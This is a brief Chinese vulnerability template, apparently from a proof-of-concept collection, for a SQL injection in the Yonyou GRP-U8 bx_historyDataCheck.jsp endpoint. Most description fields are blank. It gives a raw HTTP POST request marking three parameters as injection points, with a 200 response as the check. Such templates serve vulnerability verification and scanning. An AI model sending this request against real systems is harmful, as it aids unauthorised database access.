﻿# 用友GRP-U8 bx_historyDataCheck.jsp SQL注入漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
POST /u8qx/bx_historyDataCheck.jsp HTTP/1.1
Connection: close
Content-Type: application/x-www-form-urlencoded

userName=*&ysnd=*&historyFlag=*
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：用友GRP-U8 bx_historyDataCheck.jsp SQL注入漏洞.poc
